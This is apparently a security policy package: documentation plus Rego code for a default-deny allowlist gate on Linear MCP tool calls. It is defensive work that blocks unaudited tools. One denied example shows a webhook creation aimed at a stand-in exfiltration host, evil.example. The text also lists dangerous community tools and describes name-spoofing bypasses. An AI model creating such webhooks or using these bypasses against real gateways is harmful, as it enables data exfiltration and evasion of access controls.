---
name: Default-Deny Unknown Linear Tools
tags:
  - linear
  - default-deny-unknown-tools
  - allowlist
  - ingress
  - soc2
publishedAt: 2026-07-12
description: |
  # linear / default-deny-unknown-tools

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny — only tools whose name matches the pinned allowlist pass
  **Package:** `linear.ingress.default_deny_unknown_tools`

  ## What it does

  Pins an audited allowlist of the **verified official Linear MCP tool names** and
  allows a call only when the incoming tool name matches an allowlisted name on
  its **suffix** (case-insensitive, separator-tolerant). Everything else is denied
  before it reaches the Linear server and surfaced as a gateway event — the drift
  signal that flags a new, renamed, aggregator-added, or community-server tool the
  moment it first appears.

  `allow` defaults to `false`, so an unrecognized, missing, empty, non-string, or
  non-ASCII tool name matches nothing and fails **closed**. This is the outer
  boundary for the Linear pipeline: the default state of any tool the tenant has
  not enumerated is "inaccessible."

  Linear is the sharp case for a default-deny gate because its tool surface is a
  moving, three-headed target:

  - **The official set drifts upward and is undocumented.** Linear publishes no
    tools reference ("more functionality on the way"), and catalogs have counted
    the official set at 22 → 25 → ~31 across 2025-2026. The February 2026
    product-management drop added create/edit tools for **initiatives, initiative
    updates, project milestones, and project updates** — but their exact tool
    names are **unverified** (aggregators guess `create_initiative`,
    `create_project_update`-style names; confirm on a live `tools/list`). This
    policy does **not** invent those names: they are denied until an operator
    verifies and pins them.
  - **The `tacticlaunch` community sidecar exposes ~150 far more dangerous tools.**
    Where the official server is a ~24-tool read/write surface with **no
    delete/archive tools at all**, `tacticlaunch/mcp-linear` surfaces the whole
    GraphQL API: `linear_createWebhook` (a standing out-of-band exfiltration feed),
    `linear_logoutSession` / `linear_logoutAllSessions` (account-level DoS),
    `linear_getOrganizationAuditEvents` / `linear_getUserAuditEvents` (org-wide
    surveillance), plus ~45 delete/archive tools and membership-mutation tools.
    None of these matches an allowlisted official action name, so every one is
    denied until an operator reviews it.
  - **Three naming schemes for the same actions.** The official server uses bare
    `snake_case` (`create_issue`), `tacticlaunch` uses `linear_` + camelCase
    (`linear_createIssue`), and the deprecated `jerhadf` server uses `linear_` +
    snake_case (`linear_create_issue`). Behind a DTwo gateway each also gets the
    configured server-name prefix. The allowlist is one set of canonical official
    action names; matching is case-insensitive, separator-tolerant, and
    suffix-anchored so a single pinned name spans all three spellings (see **Tool
    name matching**).

  ## Pin the allowlist to YOUR pipeline at import time

  The shipped `allowed_tool_names` array is the **verified official Linear
  baseline enumerated in the landscape note** (Fiberplane's November 2025 analysis,
  corroborated by remote-mcp.com): 23 workspace read/write tools plus
  `search_documentation` (Linear help docs, not workspace data) — 24 distinct
  verified names in all. (The source labels this "the 23-tool baseline"; its own
  enumeration lists 24 distinct names, so all 24 are pinned here rather than
  guessing which to drop.) This is a **per-tenant starting point, not a finished
  allowlist**: the official set drifts, the February 2026 tool names are
  unverified, and your tenant may run a community or aggregator server instead.

  Before you enable deny mode, **re-enumerate your live surface with a `tools/list`
  call and pin your own allowlist.** Because matching is suffix-anchored, the
  gateway's `<server-name>-` prefix does **not** need to be added to each entry —
  a bare canonical name matches the prefixed call on its suffix. But if you swap
  the official server for `tacticlaunch` or a StackOne-style aggregator, the *verb
  vocabulary* changes (the community server uses `getIssues` where the official
  server uses `list_issues`), so most of the seed list will no longer match and
  you must re-pin to the audited names your server actually exposes.

  ## Compliance alignment

  - **SOC 2 CC6.1** — supports logical access security over protected assets: the
    agent channel can only reach Linear tools that were explicitly reviewed and
    enumerated. (coverage-matrix §2.1, PF-28)
  - **SOC 2 CC6.6** — supports boundary protection against external threats:
    upstream-added, renamed, or server-swapped tools (`tacticlaunch` webhooks,
    session logout, audit reads, deletes; aggregator write actions) do not become
    reachable through the gateway boundary without an explicit allowlist change.
    (coverage-matrix §2.1, PF-28)
  - **SOC 2 CC6.8** — supports prevention of unauthorized software: tools not on
    the audited list are unauthorized-by-default on the agent path.
    (coverage-matrix §2.1, PF-28)
  - **SOC 2 CC7.2 / CC7.3** — deny decisions from this policy surface tool drift
    (new/renamed upstream tools, swapped-in aggregator or community surfaces) as
    observable gateway events that feed anomaly monitoring and event evaluation.
    (coverage-matrix §2.1, "PF-28 alerts")
  - **GDPR Art. 25** — supports data protection by design and by default on the
    agent channel: the default state of any new Linear tool is "inaccessible until
    audited," and Linear tools routinely return personal and confidential data
    (assignees, commenters, customer records, security-issue tickets, unreleased
    roadmaps and initiative updates). (coverage-matrix §2.4, PF-28)

  ## Tool name matching

  Matching is on `lower(input.resource.name)` and is **suffix-anchored with a
  separator boundary**, so one canonical allowlisted name spans the three real
  naming schemes:

  - The **bare official** name matches exactly (`create_issue`).
  - A **prefixed** name matches when the allowlisted name follows a separator
    (`_`, `-`, or `.`): the gateway `<server-name>-` prefix (`linear-mcp-create_issue`)
    and the `jerhadf` `linear_` prefix (`linear_create_issue`) both clear this.
  - The **`tacticlaunch` camelCase** spelling is covered by also matching each
    allowlisted name with its underscores stripped (`create_issue` → `createissue`),
    so `linear_createIssue` (lowercased `linear_createissue`, ending in
    `_createissue`) matches.

  The separator boundary is deliberate: a crafted name that merely *ends in* an
  allowlisted string without a separator before it — e.g. `superCreateIssue` — is
  **denied**, because matching requires either a full-string equality or an `_` /
  `-` / `.` immediately before the allowlisted suffix. This closes the "long name
  ending in an allowed suffix" bypass that a naive `endswith` would admit.

  Before matching, the **raw** (pre-lowercase) name must consist only of the ASCII
  set real tool names and gateway prefixes use — `[A-Za-z0-9._-]`. This check runs
  **before** `lower()`, which closes a Unicode case-folding / homoglyph evasion:
  `lower()` can fold some non-ASCII code points onto ASCII letters, and a homoglyph
  in the prefix could otherwise fabricate a fake separator boundary. Any name with
  a character outside that set is denied.

  Note this is intentionally more permissive than an *exact-match* PF-28 gate
  (like the Gusto one): Linear's three-scheme naming forces suffix matching, and
  the tradeoff is the crafted-suffix residual documented under **Known
  limitations**. Where a single fixed naming scheme is known, prefer exact match.

  ## Argument shape

  This policy inspects only the tool **name** (`input.resource.name`); it reads no
  arguments, so it is insensitive to argument-shape differences between the
  official, `tacticlaunch`, and `jerhadf` servers. A missing `resource` or
  `resource.name` resolves to `""` via `object.get` and matches nothing (deny). A
  **non-string** name (null, number, object, array — a malformed or hostile
  request) is coerced to `""` rather than handed to `lower()`; without that guard
  `lower()` would raise a built-in type error that leaves `allow`/`reason`
  undefined — a deny with no surfaced reason. With the guard it is a clean,
  reasoned deny.

  ## Examples

  ### Allowed — bare official name

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "create_issue", "type": "tool" },
      "payload": {
        "name": "create_issue",
        "args": { "title": "Fix login bug", "teamId": "t-123" }
      }
    }
  }
  ```

  `allow = true`, no reason.

  ### Allowed — tacticlaunch camelCase spelling of an allowlisted action

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "linear-mcp-linear_createIssue", "type": "tool" },
      "payload": {
        "name": "linear-mcp-linear_createIssue",
        "args": { "title": "Fix login bug", "teamId": "t-123" }
      }
    }
  }
  ```

  `allow = true` (matches `create_issue` on its underscore-stripped suffix).

  ### Denied — dangerous community tool (standing webhook)

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "linear-mcp-linear_createWebhook", "type": "tool" },
      "payload": {
        "name": "linear-mcp-linear_createWebhook",
        "args": { "url": "https://evil.example/collect", "resourceTypes": ["Issue"] }
      }
    }
  }
  ```

  `allow = false`, `reason = "This Linear tool is not on the audited allowlist (...)"`.

  ## Composition

  This policy is the outer gate — it decides *which* Linear tools exist for agents.
  Pair it with policies that constrain *how* the allowlisted tools are used (all
  drawn from the Linear landscape note's candidate list):

  - A **webhook / persistence lockdown** ingress deny (`*createWebhook`,
    `*deleteWebhook`) — redundant with this gate while the seed list holds, but
    valuable defense-in-depth if a tenant widens the allowlist.
  - A **destructive-suffix deny** (`*delete*` / `*archive*` / `*logout*`) gated to
    an admin IdP group, for tenants that adopt the community sidecar.
  - A **roadmap/initiative egress gate** and **customer-data redaction** egress
    transform, since even allowlisted reads (`list_projects`, `list_documents`)
    can surface unreleased plans and customer records.
  - An **impersonation strip** transform on comment tools to remove `createAsUser`
    / `displayIconUrl` args (the `jerhadf` server bakes comment impersonation into
    its schema).

  ## Known limitations

  - **The seed list is only the verified November 2025 baseline.** It is 24 verified
    official names; it is **not** a complete or current allowlist. Linear's official
    set drifts upward (catalogs count 22 / 25 / ~31), and the **February 2026
    initiative / milestone / project-update tool names are unverified** — this
    policy denies them until an operator confirms their exact names via a live
    `tools/list` and pins them. **Confirm and re-pin the allowlist per tenant
    before enabling deny mode.**
  - **Suffix matching admits a crafted-suffix residual.** Because Linear's three
    naming schemes force suffix (not exact) matching, a hostile server could name a
    tool so that it ends in `_<allowlisted-name>` — e.g. `linear_reallyCreateIssue`
    ending in `_createissue` — and be admitted. The separator boundary blocks the
    no-separator case (`superCreateIssue`), but not a separator-prefixed splice.
    Audit the *actual* tool list your server exposes; do not rely on suffix
    matching alone against an untrusted server.
  - **Verb-vocabulary divergence on server swap.** The seed uses the official verbs
    (`list_`/`get_`/`create_`/`update_`). The `tacticlaunch` server uses `get`
    where the official server uses `list` (`linear_getIssues` vs `list_issues`), so
    most community reads will **not** match the seed and will be denied. That is
    correct fail-closed behavior — re-pin to the community server's audited names
    if you deliberately adopt it.
  - **ASCII-only tool names.** Matching requires the raw name to be `[A-Za-z0-9._-]`.
    This is deliberate (it blocks Unicode case-fold and homoglyph spoofing), but a
    deployment whose configured MCP server name contains other characters (spaces,
    `@`, `/`, non-ASCII) would see even its legitimate tools denied; rename the
    server to an ASCII slug, or relax the character class, if so.
  - **Name-based trust only.** The policy audits tool *names*, not behavior. A tool
    that keeps an allowlisted name but changes behavior upstream bypasses the intent
    while matching the letter. Re-audit when the upstream server changes.
  - **Single-app gate.** This policy denies *everything* not on the list, so it is
    intended for a Linear-scoped pipeline. If you attach it to a pipeline that also
    fronts other MCP servers, those servers' tools are denied too — attach it to the
    Linear pipeline, or add the other servers' audited names to the list.
  - **No identity-based exemptions.** All callers face the same allowlist. If you
    need a platform-admin break-glass group that can call an unaudited tool, add a
    separate `allow if` branch gated on `input.subject.claims` groups.

  > **Compliance note.** This policy supports alignment with the cited framework controls **on the MCP path only**. No policy or bundle makes an organization compliant with any framework; web-UI, native-API, and in-app access are outside the gateway's reach by design. Validate against your own compliance program before relying on it.
direction: ingress
apps:
  - linear
industries: []
bundles:
  - soc2
experimental: true
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package linear.ingress.default_deny_unknown_tools

# Deny-by-default: a tool call is allowed only if its name matches an audited
# allowlisted name on its suffix (case-insensitive, separator-tolerant). A
# missing, empty, non-string, or non-ASCII tool name matches nothing and is
# therefore denied (fail closed).
default allow := false

# Verified official Linear MCP tool names — the November 2025 baseline enumerated
# in the Linear landscape note (Fiberplane analysis, corroborated by
# remote-mcp.com). 23 workspace read/write tools + search_documentation (Linear
# help docs, not workspace data) = 24 distinct verified names. The official server
# has NO delete/archive tools; there is no destructive or raw-SQL surface here.
#
# STARTER SET — a per-tenant STARTING POINT, not a finished allowlist. Linear's
# official set drifts upward (catalogs count 22/25/~31), and the Feb-2026
# initiative/milestone/project-update tool names are UNVERIFIED and are therefore
# NOT listed here (never invent tool names) — they are denied until an operator
# confirms them via a live tools/list and pins them. Re-enumerate and re-pin per
# tenant before enabling deny mode. Lower-case, canonical (official snake_case).
allowed_tool_names := [
    # Read — issues
    "list_issues",
    "list_my_issues",
    "get_issue",
    # Read — projects
    "list_projects",
    "get_project",
    # Read — teams
    "list_teams",
    "get_team",
    # Read — users
    "list_users",
    "get_user",
    # Read — documents
    "list_documents",
    "get_document",
    # Read — cycles / comments / labels / statuses
    "list_cycles",
    "list_comments",
    "list_issue_labels",
    "list_issue_statuses",
    "get_issue_status",
    "list_project_labels",
    # Read — Linear help docs (not workspace data)
    "search_documentation",
    # Write
    "create_issue",
    "update_issue",
    "create_project",
    "update_project",
    "create_comment",
    "create_issue_label",
]

# Raw tool name straight from the request. Missing resource/name resolves to ""
# via object.get and matches nothing (fail closed).
raw_tool_name := object.get(object.get(input, "resource", {}), "name", "")

# Tool name, lowercased. A non-string name (null, number, object, array — a
# malformed or hostile request) is coerced to "" instead of being handed to
# lower(), which would raise a built-in type error and leave allow/reason
# undefined. Coercing keeps the decision a clean, reasoned deny (fail closed).
tool_name := lower(raw_tool_name) if is_string(raw_tool_name)

tool_name := "" if not is_string(raw_tool_name)

# Character-class guard on the RAW (pre-lowercase) name. Real Linear / community
# tool names and gateway <server-name>- prefixes use only ASCII letters, digits,
# underscore, dot, and hyphen. Checking the raw name BEFORE lower() closes a
# Unicode case-folding / homoglyph evasion: lower() can fold some non-ASCII code
# points onto ASCII letters, and a homoglyph in the prefix could otherwise
# fabricate a fake separator boundary and slip a visibly-different, un-audited
# name past the gate. Guarded by is_string so a non-string name still yields a
# clean, reasoned deny (no built-in type error).
raw_name_is_plain_ascii if {
    is_string(raw_tool_name)
    regex.match(`^[A-Za-z0-9._-]+$`, raw_tool_name)
}

# Acceptable canonical forms: each official name in its snake_case form PLUS its
# underscore-stripped form. The stripped form is what lets one pinned name span
# the tacticlaunch camelCase spelling (create_issue -> createissue matches
# linear_createIssue) as well as the official/jerhadf snake_case spellings.
allowed_forms contains form if {
    some canonical in allowed_tool_names
    form := canonical
}

allowed_forms contains form if {
    some canonical in allowed_tool_names
    form := replace(canonical, "_", "")
}

# Allow (branch 1): the whole tool name IS an allowlisted form. Covers the bare
# official name (create_issue) with no gateway/server prefix.
allow if {
    raw_name_is_plain_ascii
    some form in allowed_forms
    tool_name == form
}

# Allow (branch 2): the tool name ends in a separator immediately followed by an
# allowlisted form. Covers every prefixed spelling — the gateway <server-name>-
# prefix (linear-mcp-create_issue), the jerhadf linear_ prefix
# (linear_create_issue), and the tacticlaunch linear_ + camelCase spelling
# (linear_createIssue -> ..._createissue). Requiring the separator (_ / - / .)
# before the suffix blocks a crafted long name that merely ends in an allowlisted
# string with no boundary (superCreateIssue is denied).
allow if {
    raw_name_is_plain_ascii
    some form in allowed_forms
    some sep in ["_", "-", "."]
    endswith(tool_name, concat("", [sep, form]))
}

reason := "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline." if not allow
```
